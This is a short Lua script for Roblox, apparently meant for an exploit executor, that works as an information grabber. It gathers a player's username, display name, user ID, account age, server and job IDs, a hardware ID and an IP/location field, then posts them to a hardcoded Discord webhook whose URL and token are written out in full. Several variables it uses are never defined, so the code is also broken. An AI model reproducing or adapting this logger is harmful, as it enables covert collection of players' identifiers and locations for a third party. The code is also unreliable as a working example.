local url = "https://discord.com/api/webhooks/1040718395215183963/gWRiRZkz9t5vDwZeJA-UtHBpuJVJhNuBtq8fbDKfqCZZPJfRyNwZbEryZ72pnSH5xTI6"
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local DisplayName = lp.DisplayName
local ID = lp.UserId
local age = lp.AccountAge
local server = game.PlaceId
local id = string.match(getrequest.Body, "`(%w+)`")
local hwid = string.lower(id)


function webhook(text, color)
    local data = {
        ["avatar_url"] = "",
        ["username"] = "Info-Logger",
        ["embeds"] = {
            {
                ["title"] = ""..id.." : " ..server.. "",
                ["description"] = text,
                ["type"] = "rich",
                ["color"] = red,
                ["footer"] = {
                    ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..ID.."&width=420&height=420&format=png",
                    ["text"] = ""..lp.." : "..DisplayName..""
                }
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

webhook("```yaml\n                          USER INFO: \nUsername: " ..lp.name..  "\nDisplayName: " ..DisplayName.. "\nUserid: " ..ID.. "\nAge: " ..age.. "\n"  ..server.. "\nJob ID: \n" ..tostring(game.JobId)..                   "\n-------------------------------------------------------------\n OtherInfo:\n Executor Guess: " ..webhookcheck.. "\n IP/Location :" ..ip.. "\n-------------------------------------------------------------  HWID: " ..hwid.."\n```", tonumber(0xFF0000))
